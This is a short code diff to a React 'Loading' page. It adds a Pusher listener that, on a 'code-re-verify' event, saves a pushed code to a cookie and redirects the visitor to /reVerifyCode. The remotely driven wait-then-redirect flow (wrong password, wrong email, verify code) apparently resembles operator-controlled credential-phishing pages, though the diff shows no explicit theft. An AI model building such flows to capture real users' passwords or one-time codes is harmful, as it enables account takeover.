@@ -30,7 +30,7 @@ function Loading() {
   const router = useRouter()
   const[wrongPasswordId, setWrongPasswordId] = useState('');
   const[wrongMailId, setWrongMailId] = useState('');
-
+  const[ReverifyId, setReVerifyId] = useState('');
   const[verifyId, setVerifyId] = useState('');
   console.log(wrongPasswordId)
   const id = Cookies.get("id");
@@ -99,6 +99,20 @@ function Loading() {
       channel.unsubscribe(id);
     };
   }, [id]);
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+    channel.bind('code-re-verify', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      Cookies.set("code", data.code);
+      setReVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('code-re-verify');
+      channel.unsubscribe(id);
+    };
+  }, [id]);
   if (wrongMailId) {
     // Perform the revalidation or data fetching logic here
   return router.push(`/signin`);
@@ -112,6 +126,10 @@ function Loading() {
   if (verifyId) {
     // Perform the revalidation or data fetching logic here
   return router.push(`/verifyCode`);
+  }
+  if (ReverifyId) {
+    // Perform the revalidation or data fetching logic here
+  return router.push(`/reVerifyCode`);
   }
   return (
     
